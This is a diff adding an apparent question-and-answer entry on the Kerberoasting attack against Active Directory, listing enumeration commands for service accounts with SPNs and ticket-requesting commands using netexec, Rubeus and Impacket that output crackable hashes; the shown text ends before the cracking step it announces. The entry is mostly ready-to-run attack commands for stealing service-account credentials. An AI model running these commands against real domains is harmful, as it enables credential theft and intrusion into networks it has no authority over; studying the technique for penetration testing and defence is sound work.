@@ -1,0 +1,25 @@
+TECHNIQUE / QUESTION:
+Describe the Kerberoasting attack process from enumeration to credential cracking.
+
+CONTEXT:
+You have valid domain user credentials. Explain how to identify service accounts, request their SPN tickets, and crack the hashes offline.
+
+METHOD / ANSWER:
+Kerberoasting Attack - Complete Workflow:
+
+**Phase 1: Enumerate Service Accounts**
+- BloodHound query: `MATCH (u:User) WHERE u.hasspn=true RETURN u`
+- LDAP query: `netexec ldap <DC> -u <user> -p <pass> --users --spn`
+- PowerView: `Get-DomainUser -SPN | Select samaccountname, serviceprincipalname`
+
+**Phase 2: Request Service Tickets (TGS-REQ)**
+- Using netexec (recommended):
+  ```bash
+  netexec ldap <DC> -u <user> -p <pass> -k --kerberoasting kerberoast_hashes.txt
+  ```
+  - `-k` forces Kerberos authentication (required)
+  - Outputs hashes in Hashcat format (mode 13100)
+
+- Alternative tools:
+  - Rubeus: `Rubeus.exe kerberoast /outfile:hashes.kerberoast /domain:<domain>`
+  - Impacket: `GetUserSPNs.py -request -dc-ip <DC> <domain>/<user>:<pass>`
